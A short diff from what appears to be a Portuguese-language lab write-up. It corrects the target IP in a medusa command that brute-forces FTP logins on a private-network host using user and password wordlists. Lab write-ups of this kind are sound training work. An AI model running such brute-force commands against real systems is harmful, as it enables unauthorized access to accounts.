@@ -75,7 +75,7 @@ Preparar credenciais básicas para o ataque de força bruta.
 Com as wordlists prontas, foi iniciado o ataque automatizado.
 
 ```bash
-medusa -h 192.168.59.103 -U users.txt -P pass.txt -M ftp -t 6
+medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6
 ```
 
 **Parâmetros utilizados:**
